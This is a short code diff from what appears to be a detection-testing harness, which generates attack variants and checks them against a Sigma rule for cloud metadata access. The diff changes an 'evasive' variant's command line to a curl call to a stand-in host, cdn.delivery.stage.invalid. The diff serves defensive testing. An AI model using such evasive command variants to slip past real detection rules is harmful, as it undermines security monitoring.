@@ -640,7 +640,7 @@ class GraphEngine:
             variants = self.supply_craftsman.generate_variants(cycle=3)
             variant = variants[2]  # aws s3 ls
             if evasive:
-                variant.payload["CommandLine"] = "/usr/bin/curl https://example.com"
+                variant.payload["CommandLine"] = "/usr/bin/curl https://cdn.delivery.stage.invalid/p"
             res = self._sigma["cloud_imds"].evaluate(variant)
             return res.detected, res.details
 
